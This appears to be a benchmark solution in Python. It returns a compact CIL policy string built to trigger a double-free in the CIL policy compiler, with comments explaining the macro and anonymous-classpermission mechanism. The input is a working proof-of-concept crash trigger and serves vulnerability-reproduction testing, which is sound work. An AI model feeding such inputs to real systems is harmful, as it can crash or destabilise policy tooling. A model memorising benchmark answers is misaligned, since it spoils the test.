class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is a double-free in the CIL policy compiler. It is
        # triggered when an anonymous `classpermission` is passed to a macro,
        # and that macro uses the `classpermission` in a `classpermissionset`.
        #
        # The PoC constructs this scenario:
        # 1. `(macro m((classpermission p))(classpermissionset c(p)))`: Defines a
        #    macro `m` that takes a `classpermission` `p` and uses it to define a
        #    `classpermissionset` `c`.
        # 2. `(m(file(open)))`: Calls the macro `m` with an anonymous
        #    classpermission `(file(open))`.
        #
        # This structure causes the anonymous `classpermission` object to be
        # freed twice during AST destruction: once as a temporary object, and
        # once as part of the `classpermissionset` `c`, triggering the
        # vulnerability. The string is compacted to minimize its length for
        # a better score.
        poc_string = "(macro m((classpermission p))(classpermissionset c(p)))(m(file(open)))"
        return poc_string.encode("utf-8")